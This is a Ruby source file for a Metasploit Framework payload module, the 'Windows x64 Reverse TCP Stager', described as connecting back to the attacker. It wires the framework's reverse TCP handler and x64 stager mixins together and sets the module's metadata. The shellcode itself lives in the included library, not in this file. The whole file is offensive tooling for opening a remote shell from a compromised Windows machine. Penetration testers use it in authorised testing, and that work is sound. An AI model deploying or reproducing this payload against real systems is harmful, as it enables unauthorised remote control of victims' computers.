##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/handler/reverse_tcp'
require 'msf/core/payload/windows/x64/reverse_tcp'

module MetasploitModule

  CachedSize = 449

  include Msf::Payload::Stager
  include Msf::Payload::Windows::ReverseTcp_x64

  def initialize(info = {})
    super(merge_info(info,
      'Name'        => 'Windows x64 Reverse TCP Stager',
      'Description' => 'Connect back to the attacker (Windows x64)',
      'Author'      => [ 'sf' ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X64,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Convention'  => 'sockrdi',
      'Stager'      => { 'RequiresMidstager' => false }
    ))
  end
end
